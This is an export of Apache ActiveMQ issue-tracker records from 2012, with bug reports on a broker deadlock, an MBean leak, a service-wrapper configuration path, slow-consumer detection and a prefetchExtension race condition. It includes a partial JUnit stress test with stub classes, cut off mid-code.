		org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:546)
		org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
		org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)
		org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
		org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
		org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
		org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:121)
		org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:112)
		org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
		org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
		org.apache.activemq.network.DemandForwardingBridgeSupport.addSubscription(DemandForwardingBridgeSupport.java:672)
		org.apache.activemq.network.DemandForwardingBridgeSupport.addConsumerInfo(DemandForwardingBridgeSupport.java:1025)
		org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteConsumerAdvisory(DemandForwardingBridgeSupport.java:605)
		org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:497)
		org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:165)
		org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
		org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
		org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
		org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
		org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
		org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
		org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
		org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
		java.lang.Thread.run(Thread.java:619)
		",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229494,,,Tue Mar 06 16:13:27 UTC 2012,,,,,,,,,,,"0|i0ts7z:",171881,,,,,,,,,,,,,,,,,,,,,"27/Feb/12 14:39;tabish;Do you have a unit test that shows the issue?  Have you tested against the latest 5.6-SNAPSHOT?  This sounds like something that's already been fixed.;;;","27/Feb/12 14:52;s1ngle;At first I thought about: https://issues.apache.org/jira/browse/AMQ-3070 because threads are hung on: purgeDestinations, addProducer, addConsumer etc.but that's not what causing the deadlock.

I haven't tested it on 5.6 yet only on released: 5.4.3 and 5.5.1. It's rather hard to reproduce.;;;","06/Mar/12 16:13;tabish;From a code review of trunk this is already resolved by other fixes that have changed the locking strategy for the destinations collection. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Possible leak in ManangedRegionBroker unregisterDestination,AMQ-3737,12543861,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,tabish,tabish,23/Feb/12 16:28,23/Feb/12 17:15,14/Jul/23 05:43,23/Feb/12 17:15,5.5.1,,,,,5.6.0,,,JMX,,,,0,,,,,,,,,"Method unregisterDestination in ManagedRegionBroker is supposed to remove the SlowConsumerStrategy MBean on the destination it removes if one exists but the code is incorrect and will never actually do so.

{noformat}
    protected void unregisterDestination(ObjectName key) throws Exception {

        DestinationView view = null;
        removeAndRemember(topics, key, view);
        removeAndRemember(queues, key, view);
        removeAndRemember(temporaryQueues, key, view);
        removeAndRemember(temporaryTopics, key, view);
        if (registeredMBeans.remove(key)) {
            try {
                managementContext.unregisterMBean(key);
            } catch (Throwable e) {
                LOG.warn(""Failed to unregister MBean: "" + key);
                LOG.debug(""Failure reason: "" + e, e);
            }
        }
        if (view != null) {
            key = view.getSlowConsumerStrategy();
            if (key!= null && registeredMBeans.remove(key)) {
                try {
                    managementContext.unregisterMBean(key);
                } catch (Throwable e) {
                    LOG.warn(""Failed to unregister slow consumer strategy MBean: "" + key);
                    LOG.debug(""Failure reason: "" + e, e);
                }
            }
        }
    }
{noformat}

Attempts to pass the DestinationView into removeAndRemember() as an 'out' parameter so it never ends up getting set to anything and the last if will never be executed because view will always be null.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229099,,,Thu Feb 23 17:15:05 UTC 2012,,,,,,,,,,,"0|i0ai4n:",59210,,,,,,,,,,,,,,,,,,,,,"23/Feb/12 17:15;gtully;fix and test in http://svn.apache.org/viewvc?rev=1292858&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Java service wrapper ${activemq.conf} not found,AMQ-3735,12543779,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,chrisdrobison,chrisdrobison,23/Feb/12 01:23,23/Feb/12 14:14,14/Jul/23 05:43,23/Feb/12 14:14,,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"I downloaded the latest snapshot of the source today and tried installing the broker as a service using the instructions here: http://www.forwardslashbin.com/?p=46. When running it, apparently the Jetty configuration could not find the path to the conf folder. When removing the jetty.xml file from activemq xml, everything seemed to execute fine. Looking at the revision history, it looks like ${activemq.conf} is new to help externalize conf files. I'll be attaching the wrapper.log to this bug.",Ubuntu 11.10 x64,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Feb/12 01:24;chrisdrobison;wrapper.log;https://issues.apache.org/jira/secure/attachment/12515672/wrapper.log",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,229018,,,Thu Feb 23 14:14:56 UTC 2012,,,,,,,,,,,"0|i0ai4v:",59211,,,,,,,,,,,,,,,,,,,,,"23/Feb/12 01:24;chrisdrobison;Java service wrapper log file.;;;","23/Feb/12 10:32;gtully;make sure we fix for 5.6;;;","23/Feb/12 14:14;tabish;Added the activemq.conf and activemq.data defs in the wrapper.conf files.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Topic subscriber is  assumed to be slow consumer when prefetch is set to one. ,AMQ-3733,12543674,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,pgfox,pgfox,22/Feb/12 13:13,16/Mar/12 14:57,14/Jul/23 05:43,16/Mar/12 14:57,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"The broker checks for slow subscribers by checking its dispatch queue size against the prefetch size. If the dispatch queue is greater than or equal to the prefetch size the broker treats this subscription is a slow subscriber. 

However if the subscribers prefetch size is ""1"" then the subscription will get treated as a slow subscriber even if the messages do not remain long in the subscription. This can result in a lot of warning log statements 

{code}
""TopicSubscription: consumer=... has reached its prefetch limit without an ack, it appears to be slow""
{code}

and slow consumer advisory messages being generated if ""AdvisoryForSlowConsumers"" has been turned on.




",,pgfox,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Feb/12 16:13;pgfox;TopicSubscriptionSlowConsumerTest.patch;https://issues.apache.org/jira/secure/attachment/12515604/TopicSubscriptionSlowConsumerTest.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228913,,,Fri Mar 16 14:57:42 UTC 2012,,,,,,,,,,,"0|i0ai5b:",59213,,,,,,,,,,,,,,,,,,,,,"22/Feb/12 13:15;pgfox;attached a patch which contains a unit test to demonstrate the issue. Patch created on version 1291465;;;","22/Feb/12 16:13;pgfox;added timeout to ensure consumer.receive() does not hang indefinitely;;;","16/Mar/12 14:57;gtully;fix in http://svn.apache.org/viewvc?rev=1301565&view=rev

thanks for the great test case, makes a fix so much easier :-);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Different methods synchronizing on different mutexes when changing the same field,AMQ-3732,12543589,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,philliph,philliph,21/Feb/12 23:13,05/Mar/12 22:09,14/Jul/23 05:43,05/Mar/12 22:09,5.5.1,,,,,5.6.0,,,Broker,,,,0,concurrency,,,,,,,,"org.apache.activemq.broker.region.PrefetchSubscription.prefetchExtension is changed while guarded by a mutex on this (PrefetchSubscription) in PrefetchSubscription.pullMessage(...) and PrefetchSubscription.dispatchLock in PrefetchSubscription.acknowledge(...). 

This can lead to the corruption of the prefetchExtension variable (eg, prefetchExtension++ in pullMessage() is not an atomic operation so prefetchExtension may change in acknowledge() mid-way through this operation).","Darwin phillip.local 9.8.0 Darwin Kernel Version 9.8.0: Wed Jul 15 16:55:01 PDT 2009; root:xnu-1228.15.4~1/RELEASE_I386 i386 i386",teamhiro,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228828,,,Mon Mar 05 22:09:16 UTC 2012,,,,,,,,,,,"0|i0ai5j:",59214,,,,,,,,,,,,,,,,,,,,,"22/Feb/12 13:58;tabish;Do you have a junit test case that shows the issue here.;;;","22/Feb/12 20:32;philliph;Hard to show in a unit test as it's not deterministic.

I noticed it while I was trying to work out why we had non-deterministic behaviour in our AMQ stack. (Not found what the problem is yet. May very well be a misconfiguration at our end...).;;;","27/Feb/12 19:37;philliph;OK, it's not quite a unit test - it's a stress test that uses JUnit - but it illustrates the point.

This code fails on my Mac (2.66GHz Intel Core 2 Duo) after a non-deterministic number of iterations. 

Most of the code is just simple stub implementations of ActiveMQ classes and interfaces with one or two methods implemented or overriden. (I tried using JMock but it didn't seem multi-threaded friendly). Basically, it starts two threads - one to pull a message, one to acknowledge. The pulling thread should increase prefetchExtension in pullMessage() thus:
{code}
        	synchronized(this) {
        		prefetchExtension++;
        		dispatchCounterBeforePull = dispatchCounter;
        	}
{code}
The other thread calls acknowledge with the stubbed objects and PrefetchSubscription object itself in such a state that this line is executed:
{code}
                            prefetchExtension = Math.max(prefetchExtension, index + 1);
{code}
where index is the index of the number of dispatched MessageReference collection. This should never be more than 0 since only message is ever dispatch()-ed by the test. All objects are instantiated anew on each iteration.

Given this, prefetchExtension should only ever be 0 (neither test has hit their target code) or 1 (from prefetchExtension++ or Math.max(prefetchExtension, 1) because index is always 0).

However, the test demonstrates that occasionally prefetchExtension is 2. I posit that this is because the threads can sometimes execute their lines at the same time; prefetchExtension++ is not atomic (it's actually prefetchExtension = prefetchExtension + 1); and changing it is not guarded by the same mutex. 

For example, the order might look like:

Step 1. PULL THREAD: add 1 to prefetchExtension. To do this, find out what prefetchExtension is. But before this thread can do so, context switches to the thread executing acknowledge() in step 2, immediately below.

Step 2. ACK THREAD: prefetchExtension is the maximum of its current value and 1. It looks like its current value is 0 so set prefetchExtension to 1.

Step 3. PULL THREAD: has found that prefetchExtension is 1 and adds one to it giving a total of 2.


Test case:
{code}
package org.apache.activemq.broker.region;

import java.io.IOException;
import java.net.URI;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ThreadPoolExecutor;

import javax.jms.InvalidSelectorException;
import javax.jms.JMSException;

import org.apache.activemq.broker.Broker;
import org.apache.activemq.broker.BrokerService;
import org.apache.activemq.broker.Connection;
import org.apache.activemq.broker.ConnectionContext;
import org.apache.activemq.broker.Connector;
import org.apache.activemq.broker.ConsumerBrokerExchange;
import org.apache.activemq.broker.ProducerBrokerExchange;
import org.apache.activemq.broker.region.policy.DeadLetterStrategy;
import org.apache.activemq.broker.region.policy.SlowConsumerStrategy;
import org.apache.activemq.command.ActiveMQDestination;
import org.apache.activemq.command.BrokerId;
import org.apache.activemq.command.BrokerInfo;
import org.apache.activemq.command.Command;
import org.apache.activemq.command.ConnectionControl;
import org.apache.activemq.command.ConnectionInfo;
import org.apache.activemq.command.ConsumerControl;
import org.apache.activemq.command.ConsumerId;
import org.apache.activemq.command.ConsumerInfo;
import org.apache.activemq.command.DestinationInfo;
import org.apache.activemq.command.Message;
import org.apache.activemq.command.MessageAck;
import org.apache.activemq.command.MessageDispatch;
import org.apache.activemq.command.MessageDispatchNotification;
import org.apache.activemq.command.MessageId;
import org.apache.activemq.command.MessagePull;
import org.apache.activemq.command.ProducerInfo;
import org.apache.activemq.command.RemoveSubscriptionInfo;
import org.apache.activemq.command.Response;
import org.apache.activemq.command.SessionInfo;
import org.apache.activemq.command.TransactionId;
import org.apache.activemq.state.CommandVisitor;
import org.apache.activemq.store.MessageStore;
import org.apache.activemq.store.kahadb.plist.PListStore;
import org.apache.activemq.thread.Scheduler;
import org.apache.activemq.usage.MemoryUsage;
import org.apache.activemq.usage.SystemUsage;
import org.apache.activemq.usage.Usage;

import junit.framework.TestCase;

public class PrefetchSubscriptionStressTest extends TestCase {

	private PrefetchSubscriptionStub toTest;
	private final MessageId messageId = new MessageId();
	private MessageAck ack;
	private MessageReference node;

	protected void setUp() throws Exception {
		super.setUp();
	}
	
	public void testMultiThreadedAccessToPrefetchExtension() throws InterruptedException, InvalidSelectorException {
		final int callsPerThread = 1;
		final int numIterations = 1000;
		
		for (int i = 0 ; i < numIterations ; i++) {
			final MessagePull pull = initializeStubs();
			
			Thread messagePuller = new Thread(new MessagePuller(callsPerThread, pull));
			Thread dispatchAndAcknowledger = new Thread(new DispatchAndAcknowledger(ack, node, callsPerThread));
		
			startThreads(messagePuller, dispatchAndAcknowledger);
			
			waitForThreadsToStop(messagePuller, dispatchAndAcknowledger);
			
			int actualPrefetchExtensions = toTest.getPrefetchExtension();
			assertEquals(""failed on iteration: "" + i, 1, actualPrefetchExtensions);
		}
	}
	
	private void waitForThreadsToStop(Thread messagePuller, Thread dispatchAndAcknowledger) throws InterruptedException {
		dispatchAndAcknowledger.join();
		messagePuller.join();	
	}

	private void startThreads(Thread messagePuller, Thread dispatchAndAcknowledger) {
		messagePuller.start();
		dispatchAndAcknowledger.start();
	}

	private MessagePull initializeStubs() throws InvalidSelectorException {
		initialise();
		primeMessagesAndDestinations();
		final MessagePull pull = primeForPullMessage();
		return pull;
	}

	private void dispatchAndAcknowledge(final MessageAck ack, final MessageReference node, final int numToDispatch)
			throws IOException, Exception {
		ConnectionContext context = null;
		for (int i = 0 ; i < numToDispatch ; i++) {
			toTest.dispatch(node);
		}
		toTest.acknowledge(context , ack);
	}
	
	public class MessagePuller implements Runnable {
		
		private final int totalRuns;
		private final MessagePull pull;
		
		public MessagePuller(int totalRuns, MessagePull pull) {
			super();
			this.totalRuns = totalRuns;
			this.pull = pull;
		}
		
		@Override
		public void run() {
			for (int i = 0 ; i < totalRuns ; i++) {
				try {
					pullMessage(pull);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
		
	}

	private void pullMessage(final MessagePull pull) throws Exception {
		ConnectionContext context = null;
		toTest.pullMessage(context, pull);
	}

	private MessagePull primeForPullMessage() {
		final MessagePull pull = new MessagePull() {
			@Override
			public long getTimeout() {
				return -1;
			}
		};
		return pull;
	}

	
	public class DispatchAndAcknowledger implements Runnable {
		
		private final MessageAck ack;
		private final MessageReference node;
		private final int totalRuns;
		
		public DispatchAndAcknowledger(MessageAck ack, MessageReference node, int totalRuns) {
			super();
			this.ack = ack;
			this.node = node;
			this.totalRuns = totalRuns;
		}

		@Override
		public void run() {
			for (int i = 0 ; i < totalRuns ; i++) {
				try {
					dispatchAndAcknowledge(ack, node, 1);
				} catch (IOException e) {
					e.printStackTrace();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}

	private void initialise() throws InvalidSelectorException {
		SystemUsage usageManager = null;
		
		final Connection connection = new Connection() {
			
			@Override
			public void stop() throws Exception {			}
			
			@Override
			public void start() throws Exception {			}
			
			@Override
			public void updateClient(ConnectionControl control) {			}
			
			@Override
			public void serviceExceptionAsync(IOException e) {			}
			
			@Override
			public void serviceException(Throwable error) {			}
			
			@Override
			public Response service(Command command) { return null; }
			
			@Override
			public boolean isSlow() { return false; }
			
			@Override
			public boolean isNetworkConnection() { return false; }
			
			@Override
			public boolean isManageable() { return false; }
			
			@Override
			public boolean isFaultTolerantConnection() { return false; }
			
			@Override
			public boolean isConnected() { return false; }
			
			@Override
			public boolean isBlocked() { return false; }
			
			@Override
			public boolean isActive() { return false; }
			
			@Override
			public ConnectionStatistics getStatistics() { return null; }
			
			@Override
			public String getRemoteAddress() { return null; }
			
			@Override
			public int getDispatchQueueSize() { return 0; }
			
			@Override
			public Connector getConnector() { return null; }
			
			@Override
			public String getConnectionId() { return null; }
			
			@Override
			public void dispatchSync(Command message) { }
			
			@Override
			public void dispatchAsync(Command command) { }
		};
		
		final ConnectionContext context = new ConnectionContext() {
			@Override
		    public Connection getConnection() {
		        return connection;
		    }
		}; 
		
		final Broker broker = new Broker() {
			
			@Override
			public void stop() throws Exception { }
			
			@Override
			public void start() throws Exception { }
			
			@Override
			public void send(ProducerBrokerExchange producerExchange, Message message)
					throws Exception { }
			
			@Override
			public void removeSubscription(ConnectionContext context,
					RemoveSubscriptionInfo info) throws Exception { }
			
			@Override
			public void removeDestination(ConnectionContext context,
					ActiveMQDestination destination, long timeout) throws Exception { }
			
			@Override
			public void removeConsumer(ConnectionContext context, ConsumerInfo info)
					throws Exception { }
			
			@Override
			public void processDispatchNotification(
					MessageDispatchNotification messageDispatchNotification)
					throws Exception { }
			
			@Override
			public void processConsumerControl(ConsumerBrokerExchange consumerExchange,
					ConsumerControl control) { }
			
			@Override
			public Response messagePull(ConnectionContext context, MessagePull pull)
					throws Exception { return null; }
			
			@Override
			public Set<Destination> getDestinations(ActiveMQDestination destination) { return null; }
			
			@Override
			public Map<ActiveMQDestination, Destination> getDestinationMap() { return null; }
			
			@Override
			public void gc() { }
			
			@Override
			public Destination addDestination(ConnectionContext context,
					ActiveMQDestination destination, boolean createIfTemporary)
					throws Exception { return null; }
			
			@Override
			public Subscription addConsumer(ConnectionContext context, ConsumerInfo info)
					throws Exception { return null; }
			
			@Override
			public void acknowledge(ConsumerBrokerExchange consumerExchange,
					MessageAck ack) throws Exception { }
			
			@Override
			public void slowConsumer(ConnectionContext context,
					Destination destination, Subscription subs) { }
			
			@Override
			public void setAdminConnectionContext(
					ConnectionContext adminConnectionContext) { }
			
			@Override
			public void sendToDeadLetterQueue(ConnectionContext context,
					MessageReference messageReference, Subscription subscription) { }
			
			@Override
			public void rollbackTransaction(ConnectionContext context, TransactionId xid)
					throws Exception { }
			
			@Override
			public void removeSession(ConnectionContext context, SessionInfo info)
					throws Exception { }
			
			@Override
			public void removeProducer(ConnectionContext context, ProducerInfo info)
					throws Exception { }
			
			@Override
			public void removeDestinationInfo(ConnectionContext context,
					DestinationInfo info) throws Exception { }
			
			@Override
			public void removeConnection(ConnectionContext context,
					ConnectionInfo info, Throwable error) throws Exception { }
			
			@Override
			public void removeBroker(Connection connection, BrokerInfo info) { }
			
			@Override
			public int prepareTransaction(ConnectionContext context, TransactionId xid)
					throws Exception { return 0; }
			
			@Override
			public void preProcessDispatch(MessageDispatch messageDispatch) { }
			
			@Override
			public void postProcessDispatch(MessageDispatch messageDispatch) { }
			
			@Override
			public void nowMasterBroker() { }
			
			@Override
			public void networkBridgeStopped(BrokerInfo brokerInfo) { }
			
			@Override
			public void networkBridgeStarted(BrokerInfo brokerInfo,
					boolean createdByDuplex, String remoteIp) { }
			
			@Override
			public void messageExpired(ConnectionContext context,
					MessageReference messageReference, Subscription subscription) { }
			
			@Override
			public void messageDiscarded(ConnectionContext context, Subscription sub,
					MessageReference messageReference) { }
			
			@Override
			public void messageDelivered(ConnectionContext context,
					MessageReference messageReference) { }
			
			@Override
			public void messageConsumed(ConnectionContext context,
					MessageReference messageReference) { }
			
			@Override
			public boolean isStopped() { return false; }
			
			@Override
			public void isFull(ConnectionContext context, Destination destination,
					Usage usage) { }
			
			@Override
			public boolean isFaultTolerantConfiguration() { return false; }
			
			@Override
			public boolean isExpired(MessageReference messageReference) { return false; }
			
			@Override
			public URI getVmConnectorURI() { return null; }
			
			@Override
			public PListStore getTempDataStore() { return null; }
			
			@Override
			public Scheduler getScheduler() { return null; }
			
			@Override
			public Broker getRoot() { return null; }
			
			@Override
			public TransactionId[] getPreparedTransactions(ConnectionContext context)
					throws Exception { return null; }
			
			@Override
			public BrokerInfo[] getPeerBrokerInfos() { return null; }
			
			@Override
			public ThreadPoolExecutor getExecutor() { return null; }
			
			@Override
			public Set<ActiveMQDestination> getDurableDestinations() { return null; }
			
			@Override
			public ActiveMQDestination[] getDestinations() throws Exception { return null; }
			
			@Override
			public Connection[] getClients() throws Exception { return null; }
			
			@Override
			public BrokerService getBrokerService() { return null; }
			
			@Override
			public long getBrokerSequenceId() { return 0; }
			
			@Override
			public String getBrokerName() { return null; }
			
			@Override
			public BrokerId getBrokerId() { return null; }
			
			@Override
			public ConnectionContext getAdminConnectionContext() { return null; }
			
			@Override
			public Broker getAdaptor(Class type) { return null; }
			
			@Override
			public void forgetTransaction(ConnectionContext context,
					TransactionId transactionId) throws Exception { }
			
			@Override
			public void fastProducer(ConnectionContext context,
					ProducerInfo producerInfo) { }
			
			@Override
			public void commitTransaction(ConnectionContext context, TransactionId xid,
					boolean onePhase) throws Exception { }
			
			@Override
			public void brokerServiceStarted() { }
			
			@Override
			public void beginTransaction(ConnectionContext context, TransactionId xid)
					throws Exception { }
			
			@Override
			public void addSession(ConnectionContext context, SessionInfo info)
					throws Exception { }
			
			@Override
			public void addProducer(ConnectionContext context, ProducerInfo info)
					throws Exception { }
			
			@Override
			public void addDestinationInfo(ConnectionContext context,
					DestinationInfo info) throws Exception { }
			
			@Override
			public void addConnection(ConnectionContext context, ConnectionInfo info)
					throws Exception { }
			
			@Override
			public void addBroker(Connection connection, BrokerInfo info) { }
		};
		
		final ActiveMQDestination activeMQDestination = new ActiveMQDestination() {
			
			@Override
			public byte getDataStructureType() {
				return 0;
			}
			
			@Override
			protected String getQualifiedPrefix() {
				return null;
			}
			
			@Override
			public byte getDestinationType() {
				return 0;
			}
			
			@Override
			public String getPhysicalName() { 
				return ""test"";
			}
			
			@Override
			public boolean isComposite() {
				return false;
			}
		};
		
		final ConsumerInfo info = new ConsumerInfo() {
			@Override
			public ActiveMQDestination getDestination() {
				return activeMQDestination;
			}
		};
		

		toTest = new PrefetchSubscriptionStub(broker, usageManager, context, info);
	}
	
	private class PrefetchSubscriptionStub extends PrefetchSubscription {

		public PrefetchSubscriptionStub(Broker broker,
				SystemUsage usageManager, ConnectionContext context,
				ConsumerInfo info) throws InvalidSelectorException {
			super(broker, usageManager, context, info);
		}

		@Override
		public void destroy() {
			// TODO Auto-generated method stub

		}

		@Override
		protected boolean isDropped(MessageReference node) {
			// TODO Auto-generated method stub
			return false;
		}

		@Override
		protected boolean canDispatch(MessageReference node)
				throws IOException {
			// TODO Auto-generated method stub
			return false;
		}

		@Override
		protected void acknowledge(ConnectionContext context,
				MessageAck ack, MessageReference node) throws IOException {
			// TODO Auto-generated method stub

		}

		@Override
		public boolean isSlave() {
			return false;
		}

		@Override
		public int getPrefetchSize() {
			return 0;
		}

		@Override
		protected void onDispatch(final MessageReference node, final Message message) {
			
		}
		
		@Override
		protected void dispatchPending() throws IOException {
			
		}
		
		public int getPrefetchExtension() {
			return prefetchExtension;
		}
	}

	private void primeMessagesAndDestinations() {
		final Message message = new Message() {
			
			@Override
			public byte getDataStructureType() { return 0; }
			
			@Override
			public Response visit(CommandVisitor visitor) throws Exception { return null; }
			
			@Override
			public Message copy() { return null; }
			
			@Override
			public void clearBody() throws JMSException { }
		};
		final Destination destination = new Destination() {
			
			@Override
			public boolean iterate() { return false; }
			
			@Override
			public void stop() throws Exception { }
			
			@Override
			public void start() throws Exception { }
			
			@Override
			public void wakeup() { }
			
			@Override
			public void slowConsumer(ConnectionContext context, Subscription subs) { }
			
			@Override
			public void setUseCache(boolean useCache) { }
			
			@Override
			public void setProducerFlowControl(boolean value) { }
			
			@Override
			public void setMinimumMessageSize(int minimumMessageSize) { }
			
			@Override
			public void setMaxProducersToAudit(int maxProducersToAudit) { }
			
			@Override
			public void setMaxPageSize(int maxPageSize) { }
			
			@Override
			public void setMaxBrowsePageSize(int maxPageSize) { }
			
			@Override
			public void setMaxAuditDepth(int maxAuditDepth) { }
			
			@Override
			public void setLazyDispatch(boolean value) { }
			
			@Override
			public void setEnableAudit(boolean enableAudit) { }
			
			@Override
			public void setCursorMemoryHighWaterMark(int cursorMemoryHighWaterMark) { }
			
			@Override
			public void setBlockedProducerWarningInterval(
					long blockedProducerWarningInterval) { }
			
			@Override
			public void setAlwaysRetroactive(boolean value) { }
			
			@Override
			public void send(ProducerBrokerExchange producerExchange,
					Message messageSend) throws Exception { }
			
			@Override
			public void removeSubscription(ConnectionContext context, Subscription sub,
					long lastDeliveredSequenceId) throws Exception { }
			
			@Override
			public void removeProducer(ConnectionContext context, ProducerInfo info)
					throws Exception { }
			
			@Override
			public void processDispatchNotification(
					MessageDispatchNotification messageDispatchNotification)
					throws Exception { }
			
			@Override
			public void messageExpired(ConnectionContext context, Subscription subs,
					MessageReference node) { }
			
			@Override
			public void messageDiscarded(ConnectionContext context, Subscription sub,
					MessageReference messageReference) { }
			
			@Override
			public void messageDelivered(ConnectionContext context,
					MessageReference messageReference) { }
			
			@Override
			public void messageConsumed(ConnectionContext context,
					MessageReference messageReference) { 	}
			
			@Override
			public void markForGC(long timeStamp) { }
			
			@Override
			public boolean isUseCache() { return false; }
			
			@Override
			public boolean isProducerFlowControl() { return false; }
			
			@Override
			public boolean isPrioritizedMessages() { return false; }
			
			@Override
			public boolean isLazyDispatch() { return false; }
			
			@Override
			public void isFull(ConnectionContext context, Usage<?> usage) { }
			
			@Override
			public boolean isEnableAudit() { return false; }
			
			@Override
			public boolean isDisposed() { return false; }
			
			@Override
			public boolean isAlwaysRetroactive() { return false; }
			
			@Override
			public boolean isActive() { return false; }
			
			@Override
			public SlowConsumerStrategy getSlowConsumerStrategy() { return null; }
			
			@Override
			public String getName() { return null; }
			
			@Override
			public int getMinimumMessageSize() { return 0; }
			
			@Override
			public MessageStore getMessageStore() { return null; }
			
			@Override
			public MemoryUsage getMemoryUsage() { return null; }
			
			@Override
			public int getMaxProducersToAudit() { return 0; }
			
			@Override
			public int getMaxPageSize() { return 0; }
			
			@Override
			public int getMaxBrowsePageSize() { return 0; }
			
			@Override
			public int getMaxAuditDepth() { 	return 0; }
			
			@Override
			public long getInactiveTimoutBeforeGC() { return 0; }
			
			@Override
			public DestinationStatistics getDestinationStatistics() { return null; }
			
			@Override
			public DeadLetterStrategy getDeadLetterStrategy() { return null; }
			
			@Override
			public int getCursorMemoryHighWaterMark() { return 0; }
			
			@Override
			public List<Subscription> getConsumers() { return null; }
			
			@Override
			public long getBlockedProducerWarningInterval() { return 0; }
			
			@Override
			public ActiveMQDestination getActiveMQDestination() { return null; 	}
			
			@Override
			public void gc() { 	}
			
			@Override
			public void fastProducer(ConnectionContext context,
					ProducerInfo producerInfo) { }
			
			@Override
			public void dispose(ConnectionContext context) throws IOException { }
			
			@Override
			public boolean canGC() { return false; }
			
			@Override
			public Message[] browse() { return null; }
			
			@Override
			public void addSubscription(ConnectionContext context, Subscription sub)
					throws Exception { }
			
			@Override
			public void addProducer(ConnectionContext context, ProducerInfo info)
					throws Exception { }
			
			@Override
			public void acknowledge(ConnectionContext context, Subscription sub,
					MessageAck ack, MessageReference node) throws IOException { }
		};
		
		ack = new MessageAck() {

			@Override
			public boolean isDeliveredAck() {
				return true;
			}
			@Override
			public MessageId getLastMessageId() {
				return messageId;
			}
			
